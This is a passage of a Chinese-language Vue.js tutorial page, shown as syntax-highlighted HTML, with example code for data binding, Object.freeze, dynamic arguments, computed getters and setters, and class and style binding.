class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">var</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript"><span class="hljs-attr">el</span>:<span class="hljs-string">&quot;#app&quot;</span>,</span><br><span class="language-javascript"><span class="hljs-attr">data</span>:&#123;<span class="hljs-attr">message</span>:<span class="hljs-string">&quot;aaa&quot;</span>&#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">&#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="使用对象作为参数"><a href="#使用对象作为参数" class="headerlink" title="使用对象作为参数"></a>使用对象作为参数</h3><p>使用对象直接作为数据进行绑定会进行双向绑定</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">// 我们的数据对象</span><br><span class="hljs-selector-tag">var</span> data = &#123; <span class="hljs-selector-tag">a</span>: <span class="hljs-number">1</span> &#125;<br><br><span class="hljs-comment">// 该对象被加入到一个 Vue 实例中</span><br><span class="hljs-selector-tag">var</span> vm = new <span class="hljs-built_in">Vue</span>(&#123;<br>  data: data<br>&#125;)<br><br><span class="hljs-comment">// 获得这个实例上的 property</span><br><span class="hljs-comment">// 返回源数据中对应的字段</span><br>vm<span class="hljs-selector-class">.a</span> == data<span class="hljs-selector-class">.a</span> <span class="hljs-comment">// =&gt; true</span><br><br><span class="hljs-comment">// 设置 property 也会影响到原始数据</span><br>vm<span class="hljs-selector-class">.a</span> = <span class="hljs-number">2</span><br>data<span class="hljs-selector-class">.a</span> <span class="hljs-comment">// =&gt; 2</span><br><br><span class="hljs-comment">// ……反之亦然</span><br>data<span class="hljs-selector-class">.a</span> = <span class="hljs-number">3</span><br>vm<span class="hljs-selector-class">.a</span> <span class="hljs-comment">// =&gt; 3</span><br></code></pre></td></tr></table></figure><h3 id="object-freeze"><a href="#object-freeze" class="headerlink" title="object.freeze()"></a>object.freeze()</h3><p>Object.freeze()这会阻止修改现有的 property，也意味着响应系统无法再<em>追踪</em>变化。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>        &#123;&#123;message&#125;&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <br>    <span class="hljs-comment">&lt;!--这里单击后上面的message不会变--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">v-on:click</span>=<span class="hljs-string">&quot;message=&#x27;bbbb&#x27;&quot;</span>&gt;</span>change<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> vm=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-attr">el</span>:<span class="hljs-string">&quot;#app&quot;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">message</span>:<span class="hljs-string">&quot;aaaa&quot;</span></span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">freeze</span>(vm);</span><br><span class="language-javascript"></span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="js内部调用vue方法"><a href="#js内部调用vue方法" class="headerlink" title="js内部调用vue方法"></a>js内部调用vue方法</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>        &#123;&#123;message&#125;&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">v-on:click</span>=<span class="hljs-string">&quot;message=&#x27;bbbb&#x27;&quot;</span>&gt;</span>change<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> vm=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-attr">el</span>:<span class="hljs-string">&quot;#app&quot;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">message</span>:<span class="hljs-string">&quot;aaaa&quot;</span></span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">computed</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">aaa</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;&#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">// 直接使用会调取第三层的变量-&gt;aaaa</span></span><br><span class="language-javascript">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(vm.<span class="hljs-property">message</span>);</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">// 结果为-&gt;1</span></span><br><span class="language-javascript">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(vm.<span class="hljs-property">aaa</span>);</span><br><span class="language-javascript">    </span><br><span class="language-javascript">    <span class="hljs-comment">// 使用$可以调用vue中直接贴近的一层的key</span></span><br><span class="language-javascript">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(vm.<span class="hljs-property">$data</span>);</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">freeze</span>(vm);</span><br><span class="language-javascript"></span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="动态参数"><a href="#动态参数" class="headerlink" title="动态参数"></a>动态参数</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">v-bind:</span>[<span class="hljs-attr">attributeName</span>]=<span class="hljs-string">&quot;url&quot;</span>&gt;</span> ... <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这需要在vue中的data区域有一个变量名为attributeName,如果attributeName的值为class则和下面的一样</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">v-bind:class</span>=<span class="hljs-string">&quot;url&quot;</span>&gt;</span> ... <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p>动态参数表达式有一些语法约束，因为某些字符，如空格和引号，放在 HTML attribute 名里是无效的。例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 这会触发一个编译警告 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">v-bind:</span>[&#x27;<span class="hljs-attr">foo</span>&#x27; + <span class="hljs-attr">bar</span>]=<span class="hljs-string">&quot;value&quot;</span>&gt;</span> ... <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="v-bind和v-on的缩写"><a href="#v-bind和v-on的缩写" class="headerlink" title="v-bind和v-on的缩写"></a>v-bind和v-on的缩写</h3><p>v-bind缩写</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 完整语法 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">v-bind:href</span>=<span class="hljs-string">&quot;url&quot;</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 缩写 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">:href</span>=<span class="hljs-string">&quot;url&quot;</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 动态参数的缩写 (2.6.0+) --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">:</span>[<span class="hljs-attr">key</span>]=<span class="hljs-string">&quot;url&quot;</span>&gt;</span> ... <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p>v-on</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 完整语法 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">v-on:click</span>=<span class="hljs-string">&quot;doSomething&quot;</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 缩写 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;doSomething&quot;</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 动态参数的缩写 (2.6.0+) --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> @[<span class="hljs-attr">event</span>]=<span class="hljs-string">&quot;doSomething&quot;</span>&gt;</span> ... <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="计算属性"><a href="#计算属性" class="headerlink" title="计算属性"></a>计算属性</h2><h3 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><br>      &#123;&#123;ccc&#125;&#125;<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">      <span class="hljs-keyword">var</span> vm=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">          <span class="hljs-attr">el</span>:<span class="hljs-string">&quot;#app&quot;</span>,</span><br><span class="language-javascript">          <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">              <span class="hljs-attr">aaa</span>:<span class="hljs-number">111</span>,</span><br><span class="language-javascript">              <span class="hljs-attr">bbb</span>:<span class="hljs-number">222</span></span><br><span class="language-javascript">          &#125;,</span><br><span class="language-javascript">          <span class="hljs-attr">computed</span>:&#123;</span><br><span class="language-javascript">              <span class="hljs-attr">ccc</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">                  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">aaa</span>+<span class="hljs-variable language_">this</span>.<span class="hljs-property">bbb</span>;</span><br><span class="language-javascript">              &#125;</span><br><span class="language-javascript">          &#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">      &#125;)</span><br><span class="language-javascript">  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>其中在vue中的computed就是计算属性,在HTML代码中直接使用ccc变量就会自动调用函数进行计算,并将计算后的值进行缓存如果参数变量没有变化(比如aaa和bbb)以后调用就直接从缓存中取值不会再次进行计算</p><h3 id="计算属性的get和set"><a href="#计算属性的get和set" class="headerlink" title="计算属性的get和set"></a>计算属性的get和set</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><br>    &#123;&#123;ccc&#125;&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> vm=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>:<span class="hljs-string">&quot;#app&quot;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">aaa</span>:<span class="hljs-number">111</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">bbb</span>:<span class="hljs-number">222</span></span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">computed</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">ccc</span>:&#123;</span><br><span class="language-javascript">                <span class="hljs-attr">get</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">aaa</span>+<span class="hljs-variable language_">this</span>.<span class="hljs-property">bbb</span>;</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">                <span class="hljs-attr">set</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">value</span>)&#123;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">aaa</span>=value;</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(vm.<span class="hljs-property">ccc</span>);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>直接在第四层变量里面添加get和set方法</p><p>现在再运行 <code>vm.ccc = 1</code> 时，setter 会被调用，<code>vm.aaa</code> 相应地被更新。最终结果被返回为223</p><h2 id="关于vue对class和style的绑定"><a href="#关于vue对class和style的绑定" class="headerlink" title="关于vue对class和style的绑定"></a>关于vue对class和style的绑定</h2><h3 id="class"><a href="#class" class="headerlink" title="class"></a>class</h3><h4 id="简单的例子"><a href="#简单的例子" class="headerlink" title="简单的例子"></a>简单的例子</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;static&quot;</span> <span class="hljs-attr">v-bind:class</span>=<span class="hljs-string">&quot;&#123; active: isActive, &#x27;text-danger&#x27;: hasError &#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json">data<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>  isActive<span class="hljs-punctuation">:</span> <span class="hljs-keyword">true</span><span class="hljs-punctuation">,</span><br>  hasError<span class="hljs-punctuation">:</span> <span class="hljs-keyword">false</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>结果为</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;static active&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这里可以看到由于hasError为false所以没有成为class中的一员,而且vue绑定的class也没有覆盖前面的class</p><h4 id="使用对象修改"><a href="#使用对象修改" class="headerlink" title="使用对象修改"></a>使用对象修改</h4><p>上面的例子直接将类写在标签上我们也可以写在vue内部如</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-bind:class</span>=<span class="hljs-string">&quot;classObject&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json">data<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>  classObject<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    active<span class="hljs-punctuation">:</span> <span class="hljs-keyword">true</span><span class="hljs-punctuation">,</span><br>    &#x27;text-danger&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-keyword">false</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>这样效果和第一个例子一样</p><h4 id="使用计算属性修改"><a href="#使用计算属性修改" class="headerlink" title="使用计算属性修改"></a>使用计算属性修改</h4><p>我们也可以使用计算属性来返回一个对象</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-bind:class</span>=<span class="hljs-string">&quot;classObject&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs json">data<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>  isActive<span class="hljs-punctuation">:</span> <span class="hljs-keyword">true</span><span class="hljs-punctuation">,</span><br>  error<span class="hljs-punctuation">:</span> <span class="hljs-keyword">null</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>computed<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>  classObject<span class="hljs-punctuation">:</span> function () <span class="hljs-punctuation">&#123;</span><br>    return <span class="hljs-punctuation">&#123;</span><br>      active<span class="hljs-punctuation">:</span> this.isActive &amp;&amp; !this.error<span class="hljs-punctuation">,</span><br>      &#x27;text-danger&#x27;<span class="hljs-punctuation">:</span> this.error &amp;&amp; this.error.type === &#x27;fatal&#x27;<br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h4 id="使用数组修改"><a href="#使用数组修改" class="headerlink" title="使用数组修改"></a>使用数组修改</h4><p>还可以给vue添加数组用来动态的绑定类</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-bind:class</span>=<span class="hljs-string">&quot;[activeClass, errorClass]&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json">data<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>  activeClass<span class="hljs-punctuation">:</span> &#x27;active&#x27;<span class="hljs-punctuation">,</span><br>  errorClass<span class="hljs-punctuation">:</span> &#x27;text-danger&#x27;<br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>结果为</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;active text-danger&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>我们可以看出div的class都是由activeClass和errorClass来决定的</p><p>也可以使用三目条件和类进行复合使用</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-bind:class</span>=<span class="hljs-string">&quot;[isActive ? activeClass : &#x27;&#x27;, errorClass]&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-bind:class</span>=<span class="hljs-string">&quot;[&#123; active: isActive &#125;, errorClass]&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="style"><a href="#style" class="headerlink" title="style"></a>style</h3><h4 id="简单的例子-1"><a href="#简单的例子-1" class="headerlink" title="简单的例子"></a>简单的例子</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-bind:style</span>=<span class="hljs-string">&quot;styleObject&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json">data<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>  styleObject<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    color<span class="hljs-punctuation">:</span> &#x27;red&#x27;<span class="hljs-punctuation">,</span><br>    fontSize<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">13</span>px&#x27;<br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>当 <code>v-bind:style</code> 使用需要添加<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Vendor_Prefix">浏览器引擎前缀</a>的 CSS property 时，如 <code>transform</code>，Vue.js 会自动侦测并添加相应的前缀。—————–总之就是vue会帮我们自动添加前缀</p><h3 id="对于列表渲染"><a href="#对于列表渲染" class="headerlink" title="对于列表渲染"></a>对于列表渲染</h3><p>如果使用以下方法能够检测到数组或者对象需要更新</p><ul><li><code>push()</code></li><li><code>pop()</code></li><li><code>shift()</code></li><li><code>unshift()</code></li><li><code>splice()</code></li><li><code>sort()</code></li><li><code>reverse()</code></li><li>下面三个方式不会修改原先的数组需要替换掉原来的数组</li><li><code>filter()</code></li><li><code>concat()</code></li><li><code>slice()</code></li></ul><p>由于 JavaScript 的限制，Vue <strong>不能检测</strong>数组和对象的变化。<a 